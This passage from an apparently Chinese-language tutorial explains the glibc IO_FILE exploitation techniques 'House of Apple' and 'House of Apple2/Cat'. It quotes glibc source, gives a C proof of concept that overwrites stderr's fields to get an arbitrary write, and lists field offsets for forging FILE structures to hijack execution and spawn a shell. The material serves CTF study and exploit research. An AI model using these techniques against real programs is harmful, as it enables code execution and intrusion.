<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wsetb (FILE *f, <span class="type">wchar_t</span> *b, <span class="type">wchar_t</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* When we come to here this means the user supplied buffer is</span></span><br><span class="line"><span class="comment">     filled.  But since we must return the number of characters which</span></span><br><span class="line"><span class="comment">     would have been written in total we must provide a buffer for</span></span><br><span class="line"><span class="comment">     further use.  We can do this by writing on and on in the overflow</span></span><br><span class="line"><span class="comment">     buffer in the _IO_wstrnfile structure.  */</span></span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">		 snf-&gt;overflow_buf + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">				      / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">				      + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">					 / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Since we are not really interested in storing the characters</span></span><br><span class="line"><span class="comment">     which do not fit in the buffer we simply ignore it.  */</span></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>_IO_wstrnfile</code> 相关定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* These members are preserved for ABI compatibility.  The glibc</span></span><br><span class="line"><span class="comment">     implementation always calls malloc/free for user buffers if</span></span><br><span class="line"><span class="comment">     _IO_USER_BUF or _IO_FLAGS2_USER_WBUF are not set.  */</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_wstrnfile;</span><br></pre></td></tr></table></figure></div>
<p>因此只要控制了 <code>_wide_data</code> 指针就能完成任意地址写。其中需要绕过如下判断：</p>
<ul>
<li>为了能够进入 <code>_IO_wstrn_overflow</code> 函数的 if 判断中，需要满足 <code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code> 。</li>
<li>为了避免执行 <code>free (f-&gt;_wide_data-&gt;_IO_buf_base);</code> 需要满足 <code>f-&gt;_wide_data-&gt;_IO_buf_base</code> 为空或者 <code>f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF</code> 不为 0 ，其中 <code>_IO_FLAGS2_USER_WBUF</code> 为 8 。</li>
<li>另外如果利用 FSOP 触发需要满足：<ul>
<li><code>fp-&gt;_mode &lt;= 0</code></li>
<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/28394641dc65ceca722b37cef61c2d15.png"
                      alt="在这里插入图片描述"
                ><br><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_apple" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate a 0x100 chunk&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    <span class="type">size_t</span> *tmp = p1;</span><br><span class="line">    <span class="type">size_t</span> old_value = <span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> / <span class="number">8</span>; i++) &#123;</span><br><span class="line">        p1[i] = old_value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x702e0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="type">void</span> *) puts_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_write_ptr_addr = libc_base + <span class="number">0x3b8608</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_IO_write_ptr address: %p\n&quot;</span>, (<span class="type">void</span> *) stderr_write_ptr_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_flags2_addr = libc_base + <span class="number">0x3b8654</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_flags2 address: %p\n&quot;</span>, (<span class="type">void</span> *) stderr_flags2_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_wide_data_addr = libc_base + <span class="number">0x3b8680</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_wide_data address: %p\n&quot;</span>, (<span class="type">void</span> *) stderr_wide_data_addr);</span><br><span class="line">    <span class="type">size_t</span> sdterr_vtable_addr = libc_base + <span class="number">0x3b86b8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;vtable address: %p\n&quot;</span>, (<span class="type">void</span> *) sdterr_vtable_addr);</span><br><span class="line">    <span class="type">size_t</span> _IO_wstrn_jumps_addr = libc_base + <span class="number">0x3b3c40</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *) _IO_wstrn_jumps_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_IO_write_ptr to -1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) stderr_write_ptr_addr = (<span class="type">size_t</span>) <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_flags2 to 8&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) stderr_flags2_addr = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) stderr_wide_data_addr = (<span class="type">size_t</span>) p1;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) sdterr_vtable_addr = (<span class="type">size_t</span>) _IO_wstrn_jumps_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: call fcloseall and trigger house of apple&quot;</span>);</span><br><span class="line">    fcloseall();</span><br><span class="line">    tmp = p1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="House-of-Apple2-House-of-Cat"><a href="#House-of-Apple2-House-of-Cat" class="headerlink" title="House of Apple2 | House of Cat"></a>House of Apple2 | House of Cat</h2><p><code>_wide_data</code> 结构中有一个类似 <code>vtable</code> 的 <code>_wide_vtable</code> 指向 <code>_IO_jump_t</code> 结构。</p>
<p>与 <code>vtable</code> 相同，对 glibc 中也定义了调用 <code>_wide_vtable</code> 中函数的宏，其中在 glibc 中真正使用到的有 <code>_IO_WSETBUF</code>、<code>_IO_WUNDERFLOW</code>、<code>_IO_WDOALLOCATE</code>，但与 <code>vtable</code> 不同的是这三个宏均缺少对 <code>_wide_vtable</code> 位置的检查。</p>
<p>例如 <code>_IO_OVERFLOW</code> 的宏在调用 <code>__overflow</code> 函数之前调用了 <code>IO_validate_vtable</code> 检查 <code>vtable</code> 位置的合法性。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br></pre></td></tr></table></figure></div>

<p>而 <code>_IO_WOVERFLOW</code> 没有检查。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure></div>

<p>因此可以通过修改 <code>vtable</code> 改变程序执行流程，使程序调用 <code>_wide_vtable</code> 中的函数，然后再将 <code>_wide_vtable</code> 指向一个伪造的函数表从而劫持程序执行流程。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/214fa556139c2a5b9595aa209bbff5df.png"
                      alt="在这里插入图片描述"
                ><br>具体利用方式有以下几种：</p>
<h3 id="利用-IO-wfile-overflow函数控制程序执行流"><a href="#利用-IO-wfile-overflow函数控制程序执行流" class="headerlink" title="利用_IO_wfile_overflow函数控制程序执行流"></a>利用_IO_wfile_overflow函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>;sh;</code> 。</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<p>函数的调用链如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure></div>

<p>详细分析如下：<br>首先看<code>_IO_wfile_overflow</code>函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wdoallocbuf (f);<span class="comment">// 需要走到这里</span></span><br><span class="line">      <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>需要满足<code>f-&gt;_flags &amp; _IO_NO_WRITES == 0</code>并且<code>f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0</code>和<code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code></p>
<p>然后看<code>_IO_wdoallocbuf</code>函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)<span class="comment">// _IO_WXXXX调用</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">             fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure></div>

<p>需要满足<code>fp-&gt;_wide_data-&gt;_IO_buf_base == 0</code>和<code>fp-&gt;_flags &amp; _IO_UNBUFFERED == 0</code>。</p>
<h3 id="利用-IO-wfile-underflow-mmap函数控制程序执行流"><a href="#利用-IO-wfile-underflow-mmap函数控制程序执行流" class="headerlink" title="利用_IO_wfile_underflow_mmap函数控制程序执行流"></a>利用_IO_wfile_underflow_mmap函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<p>函数的调用链如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure></div>

<p>详细分析如下：<br>看<code>_IO_wfile_underflow_mmap</code>函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);<span class="comment">// 需要走到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base == NULL</code>和<code>fp-&gt;_wide_data-&gt;_IO_save_base == NULL</code>。</p>
<h3 id="利用-IO-wdefault-xsgetn函数控制程序执行流"><a href="#利用-IO-wdefault-xsgetn函数控制程序执行流" class="headerlink" title="利用_IO_wdefault_xsgetn函数控制程序执行流"></a>利用_IO_wdefault_xsgetn函数控制程序执行流</h3><p><strong>这条链执行的条件是调用到_IO_wdefault_xsgetn时rdx寄存器，也就是第三个参数不为0</strong>。如果不满足这个条件，可选用其他链。</p>
<p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>0x800</code></li>
<li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可</li>
<li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>
</ul>
<p>函数的调用链如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wdefault_xsgetn</span><br><span class="line">    __wunderflow</span><br><span class="line">        _IO_switch_to_wget_mode</span><br><span class="line">            _IO_WOVERFLOW</span><br><span class="line">                *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure></div>

<p>详细分析如下：<br>首先看<code>_IO_wdefault_xsgetn</code>函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_wdefault_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="type">wchar_t</span> *s = (<span class="type">wchar_t</span>*) data;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Data available. */</span></span><br><span class="line">      <span class="type">ssize_t</span> count = (fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">size_t</span>) count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);</span><br><span class="line">          fp-&gt;_wide_data-&gt;_IO_read_ptr += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">wchar_t</span> *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">          <span class="type">int</span> i = (<span class="type">int</span>) count;</span><br><span class="line">          <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">        *s++ = *p++;</span><br><span class="line">          fp-&gt;_wide_data-&gt;_IO_read_ptr = p;</span><br><span class="line">            &#125;</span><br><span class="line">            more -= count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || __wunderflow (fp) == WEOF)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span 